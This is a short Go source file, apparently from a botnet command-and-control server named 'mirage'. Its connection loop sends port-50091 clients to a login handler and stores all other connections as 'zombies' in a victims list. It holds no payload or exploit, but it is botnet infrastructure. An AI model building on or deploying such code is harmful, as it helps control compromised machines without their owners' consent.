package main

import (
	"fmt"
	"mirage/global"
	"mirage/utils"
	"net"
	"strings"
)

func acceptConnection(listener *net.Listener) {
	for {
		conn, _ := (*listener).Accept()

		if strings.Contains((*listener).Addr().String(), "50091") {
			go handleLogin(&conn)
		} else {
			fmt.Println("Accepted Zombie")
			global.VictimsConnection = append(global.VictimsConnection, &conn)
		}
		utils.SetTitle(&conn)
	}
}
